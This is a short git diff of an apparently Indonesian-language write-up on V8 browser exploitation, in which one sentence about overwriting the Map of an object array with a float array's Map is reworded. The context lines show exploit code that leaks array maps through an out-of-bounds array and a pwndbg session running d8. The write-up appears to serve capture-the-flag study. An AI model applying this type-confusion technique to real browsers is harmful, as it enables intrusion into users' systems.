@@ -528,7 +528,7 @@ var obj_arr_map = ((ftoi(oob[21]) >> 32n));
 console.log("Float_arr_map: 0x"+float_arr_map.toString(16));
 console.log("Obj_arr_map: 0x"+obj_arr_map.toString(16));
 ```
-Selanjutnya kita coba overwrite value dari **Map** dari variable **obj_arr** menjadi value **Map of float_arr**.<br>
+Selanjutnya kita coba overwrite value **Map** dari variable **obj_arr** menjadi value **Map of float_arr**.<br>
 ```js
 pwndbg> run --allow-natives-syntax --shell ./test.js 
 Starting program: /home/linuz/Desktop/CSI/BrowserEXP/Modern/pwn_modern_typer/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell ./test.js
